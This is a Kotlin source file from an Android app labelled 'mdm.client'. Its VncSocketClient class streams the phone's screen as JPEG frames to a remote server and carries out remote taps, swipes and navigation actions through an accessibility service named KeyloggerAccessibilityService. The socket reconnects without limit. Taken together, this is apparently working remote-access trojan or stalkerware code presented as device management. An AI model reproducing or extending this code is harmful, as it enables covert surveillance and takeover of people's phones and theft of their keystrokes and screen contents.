package com.mdm.client.network

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.mdm.client.config.AppConfig
import com.mdm.client.keylogger.KeyloggerAccessibilityService
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import java.net.URISyntaxException

class VncSocketClient(private val context: Context) {

    companion object {
        private const val TAG = "DispSock"
    }

    private var socket: Socket? = null

    @Volatile var isStreaming = false
        private set

    fun connect() {
        val url = AppConfig.getVncSocketUrl(context)
        try {
            val opts = IO.Options().apply {
                transports = arrayOf("websocket")
                reconnection = true
                reconnectionDelay = 2000
                reconnectionAttempts = Int.MAX_VALUE
            }
            socket = IO.socket(url, opts)
            socket?.apply {
                on(Socket.EVENT_CONNECT) { Log.i(TAG, "Connected to VNC server") }
                on(Socket.EVENT_DISCONNECT) {
                    Log.i(TAG, "Disconnected from VNC server")
                    isStreaming = false
                }
                on("start_stream") {
                    Log.i(TAG, "start_stream")
                    isStreaming = true
                }
                on("stop_stream") {
                    Log.i(TAG, "stop_stream")
                    isStreaming = false
                }
                on("perform_tap") { args ->
                    val data = args.getOrNull(0) as? JSONObject ?: return@on
                    val x = data.optInt("x", 0)
                    val y = data.optInt("y", 0)
                    dispatchTap(x.toFloat(), y.toFloat())
                }
                on("perform_touch_move") { args ->
                    val data = args.getOrNull(0) as? JSONObject ?: return@on
                    dispatchSwipe(
                        data.optInt("sx").toFloat(), data.optInt("sy").toFloat(),
                        data.optInt("ex").toFloat(), data.optInt("ey").toFloat()
                    )
                }
                on("perform_gesture") { args ->
                    val data = args.getOrNull(0) as? JSONObject ?: return@on
                    when (data.optString("type")) {
                        "back"    -> dispatchGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
                        "home"    -> dispatchGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
                        "recents" -> dispatchGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS)
                    }
                }
                connect()
            }
        } catch (e: URISyntaxException) {
            Log.e(TAG, "Bad URL: $url — ${e.message}")
        }
    }

    /** Emit a screen frame (base64 JPEG) to the VNC server. */
    fun sendFrame(base64Jpeg: String, width: Int, height: Int) {
        socket?.emit("screen_data", JSONObject().apply {
            put("image", base64Jpeg)
            put("width", width)
            put("height", height)
        })
    }

    private fun dispatchTap(x: Float, y: Float) {
        val service = KeyloggerAccessibilityService.instance ?: return
        val path = Path().apply { moveTo(x, y) }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 100))
            .build()
        Handler(Looper.getMainLooper()).post {
            service.dispatchGesture(gesture, null, null)
        }
    }

    private fun dispatchSwipe(sx: Float, sy: Float, ex: Float, ey: Float) {
        val service = KeyloggerAccessibilityService.instance ?: return
        val path = Path().apply {
            moveTo(sx, sy)
            lineTo(ex, ey)
        }
        val gesture = GestureDescription.Builder()
            .addStroke(GestureDescription.StrokeDescription(path, 0, 500))
            .build()
        Handler(Looper.getMainLooper()).post {
            service.dispatchGesture(gesture, null, null)
        }
    }

    private fun dispatchGlobalAction(action: Int) {
        Handler(Looper.getMainLooper()).post {
            KeyloggerAccessibilityService.instance?.performGlobalAction(action)
        }
    }

    fun disconnect() {
        isStreaming = false
        socket?.disconnect()
        socket = null
    }
}
